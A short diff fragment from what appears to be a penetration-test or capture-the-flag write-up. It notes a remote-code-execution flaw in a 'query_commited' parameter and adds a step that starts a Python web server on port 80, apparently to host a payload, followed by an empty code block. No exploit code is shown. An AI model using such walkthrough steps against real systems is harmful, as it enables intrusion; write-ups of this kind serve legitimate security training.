@@ -293,5 +293,14 @@ Priority: u=0
 
 So after some research the RCE lies in the `query_commited` parameter
 
+```python
+python3 -m http.server 80  
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
 
+So ill start up a wabserver
+
+```python
+
+```
 
